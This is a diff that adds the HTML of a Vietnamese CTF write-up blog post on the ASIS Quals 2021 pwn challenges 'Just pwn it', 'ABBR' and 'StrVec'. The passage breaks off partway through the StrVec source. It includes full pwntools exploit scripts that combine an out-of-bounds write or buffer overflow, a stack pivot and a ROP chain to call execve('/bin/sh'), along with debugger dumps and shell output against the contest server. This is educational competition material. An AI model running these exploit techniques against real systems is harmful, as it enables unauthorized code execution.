@@ -1,0 +1,1128 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>ASIS QUALS - Just pwn it, ABBR, StrVec | pivik</title>
+<meta name="keywords" content="">
+<meta name="description" content="Cuối tuần rồi mình có chơi giải ASIS cùng với ae team Underrated, và được vào chung kết rồi nè 🥰
+Mình giải các challenge pwn là chủ yếu và làm được 3 bài. Các challenge giải này theo mình đánh giá là khá hay.
+Các binary với solve script mình sẽ để ở đây.
+Just pwn it: Category: pwn Points: 51 Solves: 106 Description: Just Pwn It! Nothing else!! Source code overview Tác giả cho luôn source, vậy cùng xem qua nào!">
+<meta name="author" content="">
+<link rel="canonical" href="https://pivik271.github.io/posts/asisquals2021/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css" integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://pivik271.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://pivik271.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://pivik271.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://pivik271.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://pivik271.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="ASIS QUALS - Just pwn it, ABBR, StrVec" />
+<meta property="og:description" content="Cuối tuần rồi mình có chơi giải ASIS cùng với ae team Underrated, và được vào chung kết rồi nè 🥰
+Mình giải các challenge pwn là chủ yếu và làm được 3 bài. Các challenge giải này theo mình đánh giá là khá hay.
+Các binary với solve script mình sẽ để ở đây.
+Just pwn it: Category: pwn Points: 51 Solves: 106 Description: Just Pwn It! Nothing else!! Source code overview Tác giả cho luôn source, vậy cùng xem qua nào!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://pivik271.github.io/posts/asisquals2021/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-10-25T18:19:29+07:00" />
+<meta property="article:modified_time" content="2021-10-25T18:19:29+07:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ASIS QUALS - Just pwn it, ABBR, StrVec"/>
+<meta name="twitter:description" content="Cuối tuần rồi mình có chơi giải ASIS cùng với ae team Underrated, và được vào chung kết rồi nè 🥰
+Mình giải các challenge pwn là chủ yếu và làm được 3 bài. Các challenge giải này theo mình đánh giá là khá hay.
+Các binary với solve script mình sẽ để ở đây.
+Just pwn it: Category: pwn Points: 51 Solves: 106 Description: Just Pwn It! Nothing else!! Source code overview Tác giả cho luôn source, vậy cùng xem qua nào!"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://pivik271.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ASIS QUALS - Just pwn it, ABBR, StrVec",
+      "item": "https://pivik271.github.io/posts/asisquals2021/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "ASIS QUALS - Just pwn it, ABBR, StrVec",
+  "name": "ASIS QUALS - Just pwn it, ABBR, StrVec",
+  "description": "Cuối tuần rồi mình có chơi giải ASIS cùng với ae team Underrated, và được vào chung kết rồi nè 🥰\nMình giải các challenge pwn là chủ yếu và làm được 3 bài. Các challenge giải này theo mình đánh giá là khá hay.\nCác binary với solve script mình sẽ để ở đây.\nJust pwn it: Category: pwn Points: 51 Solves: 106 Description: Just Pwn It! Nothing else!! Source code overview Tác giả cho luôn source, vậy cùng xem qua nào!",
+  "keywords": [
+    
+  ],
+  "articleBody": "Cuối tuần rồi mình có chơi giải ASIS cùng với ae team Underrated, và được vào chung kết rồi nè 🥰\nMình giải các challenge pwn là chủ yếu và làm được 3 bài. Các challenge giải này theo mình đánh giá là khá hay.\nCác binary với solve script mình sẽ để ở đây.\nJust pwn it: Category: pwn Points: 51 Solves: 106 Description: Just Pwn It! Nothing else!! Source code overview Tác giả cho luôn source, vậy cùng xem qua nào!\n/* * musl-gcc main.c -o chall -no-pie -fno-stack-protector -O0 -static */ #include #include #include #define STR_SIZE 0x80 void set_element(char **parray) { int index; printf(\"Index: \"); if (scanf(\"%d%*c\", \u0026index) != 1)\t// [1] exit(1); if (!(parray[index] = (char*)calloc(sizeof(char), STR_SIZE))) exit(1); printf(\"Data: \"); if (!fgets(parray[index], STR_SIZE, stdin)) exit(1); } void justpwnit() { char *array[4]; for (int i = 0; i \u003c 4; i++) { set_element(array); } } int main() { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); alarm(180); justpwnit(); return 0; } Không có gì nhiều, khá ngắn gọn.\nSolution Sau khi nhập index ở [1] xong thì chương trình không check boundary nên sẽ dẫn đến lỗi out-of-bounds. Phần buffer mình nhập không nằm trên stack mà nằm trên vùng memory được trả về bởi calloc(). Vậy để điều khiển được flow của chương trình thì mình sẽ dùng kỹ thuật stack pivot. Xem qua stack khi vào hàm set_element():\n*RBP 0x7fffffffdec0 —▸ 0x7fffffffdf00 —▸ 0x7fffffffdf10 ◂— 0x1 *RSP 0x7fffffffde90 ◂— 0x0 *RIP 0x401193 (set_element+90) ◂— lea rbx, [rdx + rax] ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 0x401176 je set_element+73 ↓ 0x401182 mov eax, dword ptr [rbp - 0x14] 0x401185 cdqe 0x401187 lea rdx, [rax*8] 0x40118f mov rax, qword ptr [rbp - 0x28] ► 0x401193 lea rbx, [rdx + rax] \u003c0x40123d\u003e 0x401197 mov esi, 0x80 0x40119c mov edi, 1 0x4011a1 call calloc 0x4011a6 mov qword ptr [rbx], rax 0x4011a9 mov rax, qword ptr [rbx] ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 00:0000│ rsp 0x7fffffffde90 ◂— 0x0 01:0008│ 0x7fffffffde98 —▸ 0x7fffffffded0 ◂— 0xb4 02:0010│ 0x7fffffffdea0 ◂— 0x0 03:0018│ 0x7fffffffdea8 ◂— 0xfffffffe00403d3f /* '?=@' */ 04:0020│ 0x7fffffffdeb0 ◂— 0x0 05:0028│ 0x7fffffffdeb8 —▸ 0x40123d (main) ◂— endbr64 06:0030│ rbp 0x7fffffffdec0 —▸ 0x7fffffffdf00 —▸ 0x7fffffffdf10 ◂— 0x1 07:0038│ 0x7fffffffdec8 —▸ 0x40122f (justpwnit+33) ◂— add dword ptr [rbp - 4], 1 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── ► f 0 0x401193 set_element+90 f 1 0x40122f justpwnit+33 f 2 0x401295 main+88 f 3 0x40147c libc_start_main_stage2+43 f 4 0x401451 libc_start_main_stage2 f 5 0x0 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u003e telescope 40 00:0000│ rsp 0x7fffffffde90 ◂— 0x0 01:0008│ 0x7fffffffde98 —▸ 0x7fffffffded0 ◂— 0xb4 02:0010│ 0x7fffffffdea0 ◂— 0x0 03:0018│ 0x7fffffffdea8 ◂— 0xfffffffe00403d3f /* '?=@' */ 04:0020│ 0x7fffffffdeb0 ◂— 0x0 05:0028│ 0x7fffffffdeb8 —▸ 0x40123d (main) ◂— endbr64 06:0030│ rbp 0x7fffffffdec0 —▸ 0x7fffffffdf00 —▸ 0x7fffffffdf10 ◂— 0x1 07:0038│ 0x7fffffffdec8 —▸ 0x40122f (justpwnit+33) ◂— add dword ptr [rbp - 4], 1 08:0040│ rax 0x7fffffffded0 ◂— 0xb4 09:0048│ 0x7fffffffded8 ◂— 0x0 Base address của array là 0x7fffffffded0, và giá trị của rbp là 0x7fffffffdec0. Vậy nếu mình nhập -2 vào index thì địa chỉ chứa ở rbp sẽ trỏ tới buffer của mình.\nRBP 0x7fffffffdec0 —▸ 0x7ffff7ff8050 ◂— 'aaaaaaaabbbbbbbb\\n' RSP 0x7fffffffde90 ◂— 0x0 *RIP 0x4011f7 (set_element+190) ◂— test rax, rax ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 0x4011e4 add rax, rcx 0x4011e7 mov rax, qword ptr [rax] 0x4011ea mov esi, 0x80 0x4011ef mov rdi, rax 0x4011f2 call fgets_unlocked ► 0x4011f7 test rax, rax 0x4011fa jne set_element+205 ↓ 0x401206 nop 0x401207 add rsp, 0x28 0x40120b pop rbx 0x40120c pop rbp ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 00:0000│ rsp 0x7fffffffde90 ◂— 0x0 01:0008│ 0x7fffffffde98 —▸ 0x7fffffffded0 ◂— 0xb4 02:0010│ 0x7fffffffdea0 ◂— 0x0 03:0018│ 0x7fffffffdea8 ◂— 0xfffffffe00403d3f /* '?=@' */ 04:0020│ 0x7fffffffdeb0 ◂— 0x0 05:0028│ 0x7fffffffdeb8 —▸ 0x40123d (main) ◂— endbr64 06:0030│ rbx rbp 0x7fffffffdec0 —▸ 0x7ffff7ff8050 ◂— 'aaaaaaaabbbbbbbb\\n' 07:0038│ 0x7fffffffdec8 —▸ 0x40122f (justpwnit+33) ◂— add dword ptr [rbp - 4], 1 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── ► f 0 0x4011f7 set_element+190 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u003e telescope 40 00:0000│ rsp 0x7fffffffde90 ◂— 0x0 01:0008│ 0x7fffffffde98 —▸ 0x7fffffffded0 ◂— 0xb4 02:0010│ 0x7fffffffdea0 ◂— 0x0 03:0018│ 0x7fffffffdea8 ◂— 0xfffffffe00403d3f /* '?=@' */ 04:0020│ 0x7fffffffdeb0 ◂— 0x0 05:0028│ 0x7fffffffdeb8 —▸ 0x40123d (main) ◂— endbr64 06:0030│ rbx rbp 0x7fffffffdec0 —▸ 0x7ffff7ff8050 ◂— 'aaaaaaaabbbbbbbb\\n' 07:0038│ 0x7fffffffdec8 —▸ 0x40122f (justpwnit+33) ◂— add dword ptr [rbp - 4], 1 08:0040│ 0x7fffffffded0 ◂— 0xb4 09:0048│ 0x7fffffffded8 ◂— 0x0 Sau khi thực hiện instruction pop rbp ở cuối hàm set_element():\n0x40120c \u003cset_element+211\u003e pop rbp và leave ; ret ở cuối hàm justpwnit():\n0x40123b \u003cjustpwnit+45\u003e leave 0x40123c \u003cjustpwnit+46\u003e ret thì mình sẽ pivot được stack lên vùng buffer mà mình control.\n*RBP 0x6161616161616161 ('aaaaaaaa') *RSP 0x7ffff7ff8058 ◂— 'bbbbbbbb\\n' *RIP 0x40123c (justpwnit+46) ◂— ret ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 0x401233 cmp dword ptr [rbp - 4], 3 0x401237 jle justpwnit+21 0x401239 nop 0x40123a nop 0x40123b leave ► 0x40123c ret \u003c0x6262626262626262\u003e ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 00:0000│ rsp 0x7ffff7ff8058 ◂— 'bbbbbbbb\\n' 01:0008│ rdx-1 0x7ffff7ff8060 ◂— 0xa /* '\\n' */ 02:0010│ 0x7ffff7ff8068 ◂— 0x0 ... ↓ 5 skipped ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── ► f 0 0x40123c justpwnit+46 f 1 0x6262626262626262 f 2 0xa f 3 0x0 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u003e Final script from pwn import * # p = elf.process() p = remote('168.119.108.148', 11010) pop_rdi = 0x0000000000401b0d mov = 0x406c3d\t# mov qword ptr [rdi], rsi ; ret pop_rsi = 0x4019a3 data_seg = 0x0040c120 pop_rax = 0x401001 syscall = 0x4013e9 pop_rdx = 0x403d23 p.recv() p.sendline(b'-2') p.recv() payload = b'a'*8 payload += p64(pop_rdi) payload += p64(data_seg) payload += p64(pop_rsi) payload += b'/bin/sh\\x00' payload += p64(mov) payload += p64(pop_rdi) payload += p64(data_seg) payload += p64(pop_rsi) payload += p64(0) payload += p64(pop_rdx) payload += p64(0) payload += p64(pop_rax) payload += p64(0x3b) payload += p64(syscall) p.sendline(payload) p.interactive() [+] Opening connection to 168.119.108.148 on port 11010: Done [*] Switching to interactive mode $ id uid=999(pwn) gid=999(pwn) groups=999(pwn) $ ls chall flag-69a1f60d8055c88ea27fed1ab926b2b6.txt $ cat flag-69a1f60d8055c88ea27fed1ab926b2b6.txt ASIS{p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?} Hihi first blood.\nABBR: Category: pwn Points: 71 Solves: 68 Description: Abbreviations in English are complicated… Why? Source code overview #include #include #include #include #include #include \"rules.h\" typedef struct Translator { void (*translate)(char*); char *text; int size; } Translator; void english_expand(char *text) { int i, alen, blen; Rule *r; char *p, *q; char *end = \u0026text[strlen(text)-1]; // pointer to the last character /* Replace all abbreviations */ for (p = text; *p; ++p) {\t// [3] for (i = 0; i \u003c sizeof(rules) / sizeof(Rule); i++) { r = \u0026rules[i]; alen = strlen(r-\u003ea); blen = strlen(r-\u003eb); if (strncasecmp(p, r-\u003ea, alen) == 0) { // i.e \"i'm pwn noob.\" --\u003e \"i'm pwn XXnoob.\" for (q = end; q \u003e p; --q) *(q+blen-alen) = *q; // Update end end += blen-alen; *(end+1) = '\\0'; // i.e \"i'm pwn XXnoob.\" --\u003e \"i'm pwn newbie.\" memcpy(p, r-\u003eb, blen); } } } } Translator *translator_new(int size) { Translator *t; /* Allocate region for text */ char *text = (char*)calloc(sizeof(char), size); if (text == NULL) return NULL; /* Initialize translator */ t = (Translator*)malloc(sizeof(Translator)); t-\u003etext = text; t-\u003esize = size; t-\u003etranslate = english_expand; return t; } void translator_reset(Translator *t) { memset(t-\u003etext, 0, t-\u003esize); } int main() { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); alarm(60); Translator *t = translator_new(0x1000); while (1) { /* Input data */ translator_reset(t); printf(\"Enter text: \"); fgets(t-\u003etext, t-\u003esize, stdin);\t// [2] if (t-\u003etext[0] == '\\n') break; /* Expand abbreviation */ t-\u003etranslate(t-\u003etext); printf(\"Result: %s\", t-\u003etext); } return 0; } Chương trình sẽ thay thế những chữ viết tắt (abbr) thành những chữ dài hơn (expanded). Dưới đây là những chữ đó:\ntypedef struct { char *a; // abbreviated string (i.e \"asap\") char *b; // expanded string (i.e \"as soon as possible\") } Rule; // Why are there so many abbreviations in English!!?? :exploding_head: Rule rules[] = { {.a=\"2f4u\", .b=\"too fast for you\"}, {.a=\"4yeo\", .b=\"for your eyes only\"}, {.a=\"fyeo\", .b=\"for your eyes only\"}, {.a=\"aamof\", .b=\"as a matter of fact\"}, {.a=\"afaik\", .b=\"as far as i know\"}, {.a=\"afk\", .b=\"away from keyboard\"}, {.a=\"aka\", .b=\"also known as\"}, {.a=\"b2k\", .b=\"back to keyboard\"}, {.a=\"btk\", .b=\"back to keyboard\"}, {.a=\"btt\", .b=\"back to topic\"}, {.a=\"btw\", .b=\"by the way\"}, {.a=\"b/c\", .b=\"because\"}, {.a=\"c\u0026p\", .b=\"copy and paste\"}, {.a=\"cys\", .b=\"check your settings\"}, {.a=\"diy\", .b=\"do it yourself\"}, {.a=\"eobd\", .b=\"end of business day\"}, {.a=\"faq\", .b=\"frequently asked questions\"}, {.a=\"fka\", .b=\"formerly known as\"}, {.a=\"fwiw\", .b=\"for what it's worth\"}, {.a=\"fyi\", .b=\"for your information\"}, {.a=\"jfyi\", .b=\"just for your information\"}, {.a=\"hf\", .b=\"have fun\"}, {.a=\"hth\", .b=\"hope this helps\"}, {.a=\"idk\", .b=\"i don't know\"}, {.a=\"iirc\", .b=\"if i remember correctly\"}, {.a=\"imho\", .b=\"in my humble opinion\"}, {.a=\"imo\", .b=\"in my opinion\"}, {.a=\"imnsho\", .b=\"in my not so humble opinion\"}, {.a=\"iow\", .b=\"in other words\"}, {.a=\"itt\", .b=\"in this thread\"}, {.a=\"dgmw\", .b=\"don't get me wrong\"}, {.a=\"mmw\", .b=\"mark my words\"}, {.a=\"nntr\", .b=\"no need to reply\"}, {.a=\"noob\", .b=\"newbie\"}, {.a=\"noyb\", .b=\"none of your business\"}, {.a=\"nrn\", .b=\"no reply necessary\"}, {.a=\"otoh\", .b=\"on the other hand\"}, {.a=\"rtfm\", .b=\"read the fine manual\"}, {.a=\"scnr\", .b=\"sorry, could not resist\"}, {.a=\"sflr\", .b=\"sorry for late reply\"}, {.a=\"tba\", .b=\"to be announced\"}, {.a=\"tbc\", .b=\"to be continued\"}, {.a=\"tia\", .b=\"thanks in advance\"}, {.a=\"tq\", .b=\"thank you\"}, {.a=\"tyvm\", .b=\"thank you very much\"}, {.a=\"tyt\", .b=\"take your time\"}, {.a=\"ttyl\", .b=\"talk to you later\"}, {.a=\"wfm\", .b=\"works for me\"}, {.a=\"wtf\", .b=\"what the fuck\"}, {.a=\"wrt\", .b=\"with regard to\"}, {.a=\"ymmd\", .b=\"you made my day\"}, {.a=\"icymi\", .b=\"in case you missed it\"}, // pwners abbreviations {.a=\"rop \", .b=\"return oriented programming \"}, {.a=\"jop \", .b=\"jump oriented programming \"}, {.a=\"cop \", .b=\"call oriented programming \"}, {.a=\"aar\", .b=\"arbitrary address read\"}, {.a=\"aaw\", .b=\"arbitrary address write\"}, {.a=\"www\", .b=\"write what where\"}, {.a=\"oob\", .b=\"out of bounds\"}, {.a=\"ret2\", .b=\"return to \"}, }; Solution Lúc đầu nhìn sơ qua thì mình không thấy bug, nhưng khi để ý kỹ lại thì ở khi nhập input cho t-text ở [2], nếu mình nhập 1 lượng lớn abbr thì phần buffer sẽ sẽ bị tràn do mình chỉ có thể thoát được vòng lặp for ở [3] khi gặp null byte, và không có đoạn nào check phần data của buffer có trở nên lớn hơn do các chữ expanded không. Các bạn xem ví dụ dưới đây để dễ hình dung:\n$ ./abbr Enter text: imnsho Result: in my not so humble opinion Enter text: imnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnsho Segmentation fault (core dumped) Với lỗi này thì mình có thể overwrite được t-\u003etranslate thành 1 địa chỉ khác. Trong lúc giải đang diễn ra thì mình giải theo hướng overwrite t-\u003etranslate thành printf() để thực hiện format string. Leak heap, pivot stack lên heap rồi build rop chain (các bạn tham khảo solve script của mình tại đây). Nhưng cách này khá dài dòng và rắc rối nên mình sẽ trình bày theo intended solution mà mình có tham khảo writeup của tác giả và làm lại sau khi kết thúc giải.\nRAX 0x214cb90 ◂— 'aaaaaaaabbbbbbbb\\n' RBX 0x400530 ◂— 0x0 *RCX 0x459e62 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */ *RDX 0x0 *RDI 0x4cc020 (_IO_stdfile_0_lock) ◂— 0x0 *RSI 0x4c9943 (_IO_2_1_stdin_+131) ◂— 0x4cc020000000000a /* '\\n' */ *R8 0x214cb90 ◂— 'aaaaaaaabbbbbbbb\\n' *R9 0x0 R10 0x49e522 ◂— 'Enter text: ' R11 0x246 R12 0x4030e0 (__libc_csu_fini) ◂— endbr64 R13 0x0 R14 0x4c9018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x44fd90 (__strcpy_avx2) ◂— endbr64 R15 0x0 RBP 0x7ffe20727c60 —▸ 0x403040 (__libc_csu_init) ◂— endbr64 RSP 0x7ffe20727c50 ◂— 0x0 *RIP 0x402015 (main+157) ◂— mov rax, qword ptr [rbp - 8] ────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────────────────────── 0x402003 mov rax, qword ptr [rbp - 8] 0x402007 mov rax, qword ptr [rax + 8] 0x40200b mov esi, ecx 0x40200d mov rdi, rax 0x402010 call fgets ► 0x402015 mov rax, qword ptr [rbp - 8] 0x402019 mov rax, qword ptr [rax + 8] 0x40201d movzx eax, byte ptr [rax] 0x402020 cmp al, 0xa 0x402022 je main+222 0x402024 mov rax, qword ptr [rbp - 8] ────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────── 00:0000│ rsp 0x7ffe20727c50 ◂— 0x0 01:0008│ 0x7ffe20727c58 —▸ 0x214dba0 —▸ 0x405121 (_nl_load_domain+737) ◂— xchg eax, esp 02:0010│ rbp 0x7ffe20727c60 —▸ 0x403040 (__libc_csu_init) ◂— endbr64 03:0018│ 0x7ffe20727c68 —▸ 0x402870 (__libc_start_main+1168) ◂— mov edi, eax 04:0020│ 0x7ffe20727c70 ◂— 0x0 05:0028│ 0x7ffe20727c78 ◂— 0x100000000 06:0030│ 0x7ffe20727c80 —▸ 0x7ffe20727d98 —▸ 0x7ffe2072934a ◂— 0x5300726262612f2e /* './abbr' */ 07:0038│ 0x7ffe20727c88 —▸ 0x401f78 (main) ◂— endbr64 ──────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────── ► f 0 0x402015 main+157 f 1 0x402870 __libc_start_main+1168 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u003e Có 2 thanh ghi chứa địa chỉ của buffer là rax và r8, vậy mình chỉ cần tìm gadget nào liên quan tới 1 trong 2 thanh ghi này và esp. Trong binary có 1 gadget như vậy là xchg eax, esp ; ret.\n*RAX 0x20727c48 RBX 0x400530 ◂— 0x0 RCX 0x459e62 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */ RDX 0x405121 (_nl_load_domain+737) ◂— xchg eax, esp RDI 0x214cb90 ◂— 'aaaaaaaabbbbbbbb\\n' RSI 0x4c9943 (_IO_2_1_stdin_+131) ◂— 0x4cc020000000000a /* '\\n' */ R8 0x214cb90 ◂— 'aaaaaaaabbbbbbbb\\n' R9 0x0 R10 0x49e522 ◂— 'Enter text: ' R11 0x246 R12 0x4030e0 (__libc_csu_fini) ◂— endbr64 R13 0x0 R14 0x4c9018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x44fd90 (__strcpy_avx2) ◂— endbr64 R15 0x0 RBP 0x7ffe20727c60 —▸ 0x403040 (__libc_csu_init) ◂— endbr64 *RSP 0x214cb90 ◂— 'aaaaaaaabbbbbbbb\\n' *RIP 0x405122 (_nl_load_domain+738) ◂— ret ────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────────────────────── 0x405121 \u003c_nl_load_domain+737\u003e xchg eax, esp ► 0x405122 \u003c_nl_load_domain+738\u003e ret \u003c0x6161616161616161\u003e ────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────── 00:0000│ rdi r8 rsp 0x214cb90 ◂— 'aaaaaaaabbbbbbbb\\n' 01:0008│ 0x214cb98 ◂— 'bbbbbbbb\\n' 02:0010│ 0x214cba0 ◂— 0xa /* '\\n' */ 03:0018│ 0x214cba8 ◂— 0x0 ... ↓ 4 skipped ──────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────── ► f 0 0x405122 _nl_load_domain+738 f 1 0x6161616161616161 f 2 0x6262626262626262 f 3 0xa f 4 0x0 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u003e Gadget đó sẽ swap eax và esp, do đó sẽ pivot được stack lên heap. Sau đó ta chỉ việc rop until it pops a shell :\u003e\nFinal script from pwn import * # p = process('./abbr') p = remote('168.119.108.148', 10010) pop_rdi = 0x4018da pop_rsi = 0x404cfe pop_rdx = 0x4017df pop_rax = 0x45a8f7 syscall = 0x4012e3 mov = 0x48a425\t# mov qword ptr [rsi], rax ; ret data_seg = 0x004c91e0 xchg_eax_esp = 0x405121 payload = b'imnsho'*150 payload += b'a'*62 payload += p64(xchg_eax_esp) p.recvuntil(b'text: ') p.sendline(payload) payload = p64(pop_rsi) payload += p64(data_seg) payload += p64(pop_rax) payload += b'/bin/sh\\x00' payload += p64(mov) payload += p64(pop_rdi) payload += p64(data_seg) payload += p64(pop_rsi) payload += p64(0) payload += p64(pop_rdx) payload += p64(0) payload += p64(pop_rax) payload += p64(0x3b) payload += p64(syscall) p.recvuntil(b'text: ') p.sendline(payload) p.interactive() [+] Opening connection to 168.119.108.148 on port 10010: Done [*] Switching to interactive mode $ id uid=999(pwn) gid=999(pwn) groups=999(pwn) $ ls chall flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt $ cat flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt ASIS{d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n} StrVec: Category: pwn Points: 114 Solves: 38 Description: How to implement secure array in C? Is it easy, right? Source code overview #include #include #include #include typedef struct { int size; void *elements[0]; } vector; void readline(const char *msg, char *buf, int length) { int i; printf(\"%s\", msg); for (i = 0; i \u003c length-1; i++) { if (read(0, \u0026buf[i], 1) != 1 || buf[i] == '\\n') break; } buf[i] = '\\0'; } int readint(const char *msg) { char buf[0x10] = {0}; readline(msg, buf, sizeof(buf)); return atoi(buf); } vector *vector_new(int nmemb) { if (nmemb \u003c= 0) return NULL; int size = sizeof(vector) + sizeof(void*) * nmemb; vector *vec = (vector*)malloc(size); if (!vec) return NULL; memset(vec, 0, size); vec-\u003esize = nmemb; return vec; } void vector_delete(vector *vec) { for (int i = 0; i \u003c vec-\u003esize; i++) free(vec-\u003eelements[i]); free(vec); } void* vector_get(vector *vec, int idx) { if (idx \u003c 0 || idx \u003e vec-\u003esize) return NULL; return vec-\u003eelements[idx]; } int vector_set(vector *vec, int idx, void *ptr) { if (idx \u003c 0 || idx \u003e vec-\u003esize) return -1; if (vec-\u003eelements[idx]) free(vec-\u003eelements[idx]); vec-\u003eelements[idx] = ptr; return 0; } int main() { char name[0x10]; readline(\"Name: \", name, sizeof(name)); printf(\"Hello, %s!\\n\", name); int n = readint(\"n = \"); vector *vec = vector_new(n); if (!vec) return 1; while (1) { int choice = readint(\"1. get\\n2. set\\n\u003e \"); switch (choice) { case 1: { int 